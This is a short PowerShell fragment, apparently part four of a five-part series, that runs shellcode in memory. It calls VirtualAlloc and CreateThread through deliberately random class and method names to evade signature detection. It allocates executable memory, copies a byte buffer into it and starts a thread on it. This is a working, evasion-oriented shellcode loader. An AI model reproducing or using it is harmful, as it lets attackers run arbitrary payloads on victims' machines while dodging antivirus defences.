#ran4

# Part 4 of 5 - Execute Shellcode
# Using the Class defined in the Add-Type Function, naming the class in [] and the API random names for VirtualAlloc and CreateThread 

$size = $buf.Length

[IntPtr]$addr = [earhatrjhsrykjxfgerwwgwegr]::onrwuighuoaeribieel(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[earhatrjhsrykjxfgerwwgwegr]::nosfubnwe0rpibnsp(0,0,$addr,0,0,0);